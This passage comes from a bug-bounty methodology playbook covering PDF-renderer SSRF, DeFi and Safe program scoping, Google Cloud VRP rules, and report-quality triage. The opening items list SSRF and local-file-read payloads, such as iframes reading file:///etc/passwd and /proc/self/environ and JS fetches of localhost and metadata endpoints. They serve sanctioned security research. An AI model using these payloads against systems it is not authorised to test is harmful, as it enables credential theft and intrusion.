7. **Engine pivot payloads when `<iframe>` is filtered:** headless Chromium accepts `<embed src>`, `<input type="image" src>`, `<video src>`, `<audio src>`, `<svg src>`, `<base href>`, `<meta http-equiv="refresh" content="0; url=...">`, or JS `fetch('http://127.0.0.1').then(async r=>document.write(await r.text()))`; wkhtmltopdf yields local file read via `<iframe src="file:///etc/passwd">` unless `--disable-local-file-access` is set; `file:///proc/self/environ` leaks `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (ECS).
8. **URL→PDF SaaS APIs** (`POST {"url": "..."}`): the `url` parameter fetches any target server-side — supply an OAST listener first, then the metadata endpoint; the fetch is blind unless rendering errors are returned.
9. **Renderer fingerprinting:** grep received PDFs' metadata for vendor strings — "Skia/PDF m65" = headless Chrome v65 (JS executes; fetch/XHR available) vs wkhtmltopdf/WeasyPrint (no JS, but `file://` iframes and CSS `url()` fetches still fire).

**FP-rule refinement:** a legitimate URL preview fetching an allowed public destination is not automatically SSRF (existing) — and HTML surviving into a PDF is not SSRF until the fetch crosses the documented destination policy; establish the violation with the OAST signal plus the denied-destination fetch.

**Anchor lessons:** a one-word impact section plus a tight PoC still earned $25,000 — Critical came from demonstrated unauthorized access to AWS credentials, not prose; IMDSv2 is the decisive hardening (a plain iframe GET returns nothing when a PUT token is required — remediating only the HTML injection leaves the renderer's fetch capability armed); stop at proof ("stopping at the right point in testing").

## PB-10 — Smart-contract and DeFi program scoping

**Provenance:** [Metric] Immunefi Metric/MetricXYZ OMM DEX program ($500k max, Primacy of Impact); [Safe] SafeFoundation bug bounty. On-chain contract review itself is out of scope for this playbook; it covers program scoping and PoC discipline.

### Metric OMM DEX specifics (custom-pricing bin pools)

- **Oracle trust boundary (the program's named Critical, $50,000 floor):** try to make an oracle accept a price update without a valid Pyth or Chainlink signature, or a compressed-feed push from an unauthorized pusher. Audit `contracts/oracles/providers/{PythOracle,ChainlinkOracle}.sol`, `oracles/compressed/CompressedOracle.sol`, `oracles/utils/LazerConsumer.sol` in Metricxyz/oracle-contracts — local forks only.
- **Mispricing (High):** a swap on an anchored-price provider pool executing outside the band or beyond its configured staleness limit; review AnchoredPriceProvider.sol band/staleness wiring and validate SwapMath.sol step math against docs/SwapMath.md (in-bin pricing, specified-in/out, fee sizing, balance limits).
- **Fee-cap/timelock bypass (High):** trace admin fee caps and the price-provider timelock through MetricOmmPoolFactory.sol; only bypassing the caps or an honestly configured timelock is in scope, and only at Medium+.
- **Unauthorized role use (High):** enumerate paths reachable without factory owner, oracle ADMIN_ROLE (blacklist, integrators, approved factories, registration fee, withdrawEth), or propAMM adapter admin rights, via auth/Auth.sol and auth/Auth2Step.sol.
- **Storage alignment:** LiquidityLib.sol is DELEGATECALL'd into the pool, and PoolStateLibrary/Slot0Library readers must match MetricOmmPool storage packing (packedSlot0Initial/packedSlot0Final on swap extension-point functions). Diff slot layouts for drift — EXTSLOAD readers read raw slots.
- **Extension hooks:** pools can run up to seven ordered IMetricOmmExtensions with a deployment-fixed call order; unimplemented BaseMetricExtension hooks revert. Test OracleValueStopLossExtension (per-bin value vs decaying high-watermark drawdown, timelocked params, cancels immediate) and PriceVelocityGuardExtension (revert bound scaled by sqrt(1 + blockDiff), first swap seeds the anchor, admin setters immediate).
- **Router settlement:** MetricOmmSimpleRouter settles core swaps via callbacks with transient context; ExternalSwapExecutor does external-venue swaps with verified refunds; users approve the router, never the executor. Probe refund/recipient accounting in multihop Sequence paths and MetricOmmPoolLiquidityAdder's callback token pulls.
- **Severity sizing:** Critical requires ≥ $10,000 of funds directly at risk, else assessed High at most; reward = 20% of funds directly affected, $50,000 floor / $500,000 cap (permanent-freezing Critical capped at $200,000); High/Medium also 20% of funds affected capped/floored at tier bounds; High yield/royalty theft uses 100% of funds at risk; temporary-freezing rewards double from the full frozen value per additional 24 h frozen up to the High cap (measure freeze duration precisely); upgradeable/pausable repeatable-attack scenarios count only the initial attack at full value, 50% reduction per subsequent 24 h window.
- **Pre-submit checks:** attacker-created pool/extension/price provider downgrades one severity; MEV within slippage/deadline out of scope; stale-feed halts (FeedStalled/staleness/deviation checks) are intended behaviour; third-party providers out of scope; rounding dust below 0.01% and $10 out unless repeatable to Medium+; 'Fix pending' list (MetricOmmPoolLiquidityAdder, SwapMath, ScheduledMultiplier, multiplier-token pricing on BNB Chain) marks the hottest no-go zones. Start in the program's named Custom Critical target space (oracle-contracts) rather than hunting generic theft first.

### Safe reporting criteria

- **Route first:** contract issues → bounty@safefoundation.org; severe Safe{Wallet} (web/mobile/backend) → wallet-reports@safe.global; non-security wallet bugs → GitHub issue. The program "applies only to smart contract-related vulnerabilities" — a web/API finding sent to the contract bounty is auto-out-of-scope.
- **Scope gate:** only page-listed contracts (core Safe v1.4.1/v1.5.0, legacy Gnosis Safe v1.1.1–v1.3.0, listed modules, Safenet Beta Staking); resolve deployed addresses via github.com/safe-global/safe-deployments.
- **Impact gate:** a finding must map to one of the page's four in-scope examples to be payable — theft of funds/tokens; freezing or permanently locking funds; replay attacks on the same chain; changing Safe or module settings without owner consent.
- **Duplicate/exclusion gate:** contracts/modules/libraries not listed; gas optimizations; known issues in audits or documentation; issues already fixed in newer versions; non-standard features on non-Mainnet EVM chains; screen against /security/audits and /security/past-bounties — "Issues already known to the Safe team or previously reported are not eligible".
- **Intended-behavior evidence:** pull the README/CHANGELOG before claiming impact — the $50k Medium tier hinges on "fund loss due to unexpected or unintuitive behavior" that "users cannot reasonably anticipate"; cite the exact intended behavior you deviate from.
- **Report format:** email with (a) detailed description, (b) steps to reproduce, (c) an Ethereum Mainnet address for payment; paid in USDC on Mainnet; anonymous submissions welcome.
- **Severity calibration from paid bounties:** Allowance Module nonce-overflow transfer replay $30,000 (Medium); Safe-set-as-owner threshold-1 bypass $5,000 (Medium); duplicate-owners setup() lockup $2,500 (Medium); getModulesPaginated drops the 'next' module $2,000 (Low); MultiSend self-destruct (UX-only) $1,000 (Low); ERC-4337 signature-padding gas grief $1,000 (Low) — pay on impact taxonomy, not bug class (30× difference between fund loss and degraded experience).
- **Safe harbor:** allow reasonable time before public disclosure; avoid privacy violations or service disruption; do not exploit in production — then no legal action; but "Public disclosure or intent to exploit a vulnerability on Mainnet will make a report ineligible". "When in doubt, the Ethereum Foundation Bug Bounty rules apply" — which require a PoC ("Issues without a POC ... are not eligible") and that testing "must take place on local running testnets". Severity caps: High ≤ $1M, Medium ≤ $50k, Low ≤ $10k.
- **Not-found note (no-fabrication standard):** the "gate-question list" sometimes attributed to this program ("downgrade, not drop", "rejection is not the end") does NOT exist in the source — not on the live page, not in any Wayback revision, not publicly searchable. It is reported as absent rather than fabricated; the actual gate is the program's eligibility rules, exclusion list, and disclosure policy above.

### Method

1. Three-tab intake (/information/, /scope/, /resources/); clone in-scope repos recursively; build (Foundry; reference versions Foundry 1.7.1 + solc 0.8.35). Program pages may publish no contract addresses — the repos are the targets.
2. Read the exclusion list FIRST: known-issues repo + all audit reports + contest findings ("known economic behaviour" clauses).
3. Map impact families to concrete contracts.
4. Fork mainnet locally; runnable Foundry PoCs for every candidate (`forge test --match-path ...`) — required for all severities.
5. Severity-size per the program matrix; submit via the program plumbing (Immunefi dashboard selecting Primacy of Impact; Safe email format).

## PB-11 — Program-rules extraction and report quality

**Provenance:** Google Cloud VRP rules + report-quality playbook (rules body, PoC article, and tier list all verified via the SPA's content API in the research pass).

### Extracting JS-gated program rules

- The rules page is a client-rendered SPA; WebFetch and JS-rendering readers may return only the shell. Working pattern: `curl -s -H "Referer: https://bughunters.google.com/" "https://bughunters.google.com/rest/v1/articles/about/rules/google-friends/cloud-vulnerability-reward-program-rules"` → JSON {title, body(markdown), documentId, public}. The same `/rest/v1/articles/<path-after-domain>` pattern fetches linked articles; `.../rest/v1/content/pages?language=en` returns the page index.
- SPA-bundle route recovery: grep the minified bundle for API hosts/paths (reference: `bughunters-pa.clients6.google.com` + Angular route configs). Wayback does not help for this SPA (snapshot is the same JS-only shell).

### Cloud VRP classification & proof

- **Classify before writing:** reward table spans full owner-equivalent project takeover at the top through multi-service write/read, single-service variants, prior-access variants, and design/metadata findings; reward-step ladder $101,010 → $75,000 → $50,000 → $31,337 → $25,000 → $20,000 → $15,000 → $13,337 → $10,000 → $7,500 → $5,000 → $3,133.70 → $1,337 → $500 → $200 → $100.
- **Impact Tier follows the ROOT-CAUSE component, not the discovery surface:** a flaw found in an IT1 product whose root cause is an IT3 component is assessed at IT3; deprecating products and Google-maintained OSS cap at IT3b. Tier list: github.com/google/bughunters/blob/main/cloud_tiers/cloud-tiers.asciipb (208 products verified).
- **Root-in-Cloud ($250,000), Path A:** for IAM/token-minting logic flaws, prove unauthorized control of `cloud-vrp@butterfly-net.iam.gserviceaccount.com` (project `butterfly-net`) with ZERO preconditions (no pre-existing permissions, no provisioned products, no non-default config, no victim interaction) via one of: POST `https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/cloud-vrp@butterfly-net.iam.gserviceaccount.com:signBlob` with `{"payload": "TmljZSBjYXRjaCE="}` (base64 of "Nice catch!"), `:signJwt` with `{"payload": "{\"aud\":\"cloud-vrp\",\"msg\":\"Nice catch!\"}"}`, or `:generateAccessToken` with `{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}`.
- **Infrastructure RCE — the Borg hard stop:** the moment a payload/SSRF/RPC yields code execution inside Borg, stop all testing — no lateral movement, no internal discovery, no credential harvesting, no Spanner/Chubby access. Safe Harbor pays on the compromised job's own privileges/reachability; unrelated internal chaining does not count toward Root-in-Cloud.
- **Never touch customer space:** exclude `*.bc.googleusercontent.com` and `*.appspot.com`; never scan CIDRs from https://www.gstatic.com/ipranges/cloud.json (a Google asset found inside a customer block during a broad scan still counts as unauthorized). Test sandbox/isolation escapes locally (sole-tenant nodes, root shell on your own GKE node, upstream gVisor); if it can't be tested safely, submit technical analysis + local repro instead of live multi-tenant testing.
- **Exceptional automated PoC spec:** minimal and self-contained (Python requests preferred; HTML/Bash/Go/Node OK), runnable in Debian/Cloud Shell, reads credentials from an easily-swapped variable ("LOGIN_TOKEN") because the panel always uses its own accounts, prints the unauthorized-data response; explicitly NO Selenium/browser automation — for DOM-XSS-style triggers skip automation and explain why; an unlisted YouTube video of the PoC run earns extra credit.
- **The seven scored dimensions** (freeze at triage): vulnerability description; attack preconditions; succinct product-specific impact analysis; complete reproduction steps; full target info (product/version/hostnames); reproduction output (fuzzer/debugger/HTTP responses); <3-workday responsiveness. Only information available BEFORE triage is considered.
- **Quality matrix:** Low 0.8x / Good 1x / Exceptional 1.2x (capped at $5,000). "No PoC" is an explicit non-qualifying category; "Theoretical or speculative impact" lands Low.
- **Downgrade ladder:** prior access, victim interaction, exploitability, uncommon configuration, and high-entropy IDs each step the amount down one rung (e.g., $5,000 → $3,133.70); footnote [3] explicitly rejects S1a claims whose PoC pre-provisions a roles/owner binding — design the proof to eliminate preconditions and high-entropy-ID dependencies before writing.
- **Plumbing:** report at bughunters.google.com/report/vrp (select 'Cloud VRP'); PGP key for sensitive details: https://services.google.com/corporate/publickey.txt.

---

# PART 2 — REPORT-QUALITY TRIAGE & PROGRAM-SCOPE DETAIL

Owner-audit reporting (`../../reporter`) remains the default output; this section supplies the triage-facing layer for bounty-program engagements. The report-quality gate in `../../reporter` is the gate; this section is the depth. The harm gate (`../../reporter`) runs FIRST: a finding must clear the seven reportability questions before the seven quality questions mean anything.

## The seven report-quality questions — scoring notes

1. **Description** — precise vulnerability behavior, not symptom or scanner label; a vague description forces triage to guess, and guessing lands Low.
2. **Preconditions** — state every precondition and eliminate the avoidable ones from the proof design; each remaining precondition (prior access, victim interaction, uncommon configuration, high-entropy IDs) steps most program rewards down one rung.
3. **Impact** — succinct and product-specific; "theoretical or speculative impact" lands Low; "no PoC" is a non-qualifying category — demonstrated impact wins regardless of prose volume (a one-word impact section plus a demonstrated credential leak earned $25,000 in the H1-2262382 case).
4. **Reproduction steps** — complete enough to re-run without follow-up; attach full request/response pairs — "or triage cannot reproduce" (the sibling-reporter warning in the Facebook race case).
5. **Target information** — product, version, hostnames, exact asset; the impact tier follows the root-cause component, so target info must identify it.
6. **Reproduction output** — raw responses, fuzzer/debugger output, timing/order data for concurrency findings, exact tool/engine configs.
7. **Responsiveness** — Google VRP scores <3-workday responsiveness as a scored dimension; enterprise programs vary but slow responses stall payouts (the Slack SAML case: next-day confirmation, ~6 months to close).

**Pre-triage freeze:** rules state only information available before triage is considered — completeness of the first submission outranks excellent later additions.

## Chain-aggregation rule (full statement)

- **Trigger:** two or more independently LOW or INFORMATIONAL findings whose combination produces a higher-severity outcome.
- **Demonstration requirement:** the chain itself must be demonstrated end-to-end with owned resources (five low OAuth flaws chained into private-repo takeover; CAPTCHA bypass + privileged-event disclosure as one kill chain). Links that were not exercised are classified Supported but not fully validated or Hypothetical per the outcome classes in `verification.md` — explicitly, in the report.
- **Severity argument:** from the demonstrated chain impact, never the sum of component severities; component severities do not add.
- **Structure:** one chain narrative; components listed separately with their own evidence; components stay individually reportable only if the program prefers component reports — do not double-report both forms.
- **The attack-path analysis worker (see `../../orchestrator`) owns the aggregation**; the outcome classes in `verification.md` govern each link's classification.

## Duplicate-avoidance procedure

1. Screen the program's known-issues repository and 'Fix pending' lists before testing (root-cause overlap disqualifies even with different symptoms).
2. Screen published audit reports and contest findings.
3. Screen past-bounty pages and any previously-reported index ("Issues already known to the Safe team or previously reported are not eligible").
4. For platform programs, screen the program's disclosed-report archive for the same root cause.
5. Record the screening result in the finding record — it is part of the scope-proof.

## Severity argumentation per program matrix

- **Impact-led, not class-led:** pay scales follow what the victim loses (silent message spoofing = "a trust failure, not a cosmetic bug"; a confirmed-but-uncontrolled identity flag breaks recovery flows; UX-only fund-adjacent behavior pays 1% of fund-loss tiers).
- **Cite public norm text where it exists:** RFC 9700 §2.3 for token-audience confusion; RFC 6749 §4.1.2/§4.1.3 for code binding; the provider's own documentation for redirect-matching and PKCE warnings; the SAML Profiles replay-detection requirement.
- **Map to the program taxonomy:** a finding must map to the program's impact examples to be payable (Safe's four examples); for platform programs use HackerOne/Bugcrowd VRT where applicable and CWE for root cause; use the program's own severity matrix as the argument frame.
- **Demonstrated vs plausible, in writing:** state what you showed (the insecure sink, the accepted assertion, the redeemed artifact) and what is plausible (the model-dependent chain, the mobile-login path); make precise non-claims (did NOT access real customer devices/feeds/recordings; did NOT measure cost amplification).
- **Scope-proof ships with the report:** the program-policy line permitting credential-, concurrency-, or auth-bypass-class techniques must accompany the evidence — "or the report is dead on triage". The safety gates (`../../safety-gates`) still prohibit credential brute-forcing on live targets regardless of program policy; where the technique is prohibited by the gates, report the limiter weakness with a harmless-operation demonstration and a lab reference.
- **Remediation expectations:** note known patterns (next-day confirmation + ~6-month close for enterprise SSO; ~14-hour fix when the impact proof was minimal and reversible) so triage and reporter expectations align.

## Program-scope awareness — intake procedure

1. **Extract the rules first** (PB-11 pattern for JS-gated pages). Never invent a rule you could not read — if a commonly-cited rule cannot be found in the source, record it as absent rather than assumed (the Safe "gate-question list" is the worked example of this discipline).
2. **Read all program tabs** (/information/, /scope/, /resources/) plus routing tables (contract vs web/wallet channels).
3. **Read the exclusion list before testing:** known-issues repos, audit reports, contest findings, past bounties.
4. **Identify the reward table and downgrade ladder** and design the proof against them.
5. **Identify hard stops** as scope boundaries (Borg for Google VRP; customer-space exclusions; mainnet prohibitions for contract programs).
6. **Identify submission plumbing:** platform + form, PGP key for sensitive details, payment-address requirements, anonymous-submission policy.
7. **DeFi/DEX custom-pricing liquidity pools:** the named Critical/High targets are usually the oracle trust boundary and the pricing math — see PB-10 for the full family (band/staleness, in-bin step math, fee caps/timelocks, role reachability, storage alignment, extension hooks, router settlement); remember the intended-behavior exclusions (stale-feed halts, MEV within slippage/deadline, rounding dust).

## Boundary

Submission is always a researcher decision. The safety gates (`../../safety-gates`) prohibit automatic submission to third parties; the triage gate prepares the report, it does not send it. All testing remains inside the G0–G3 gates and the stop conditions defined in `../../safety-gates`.
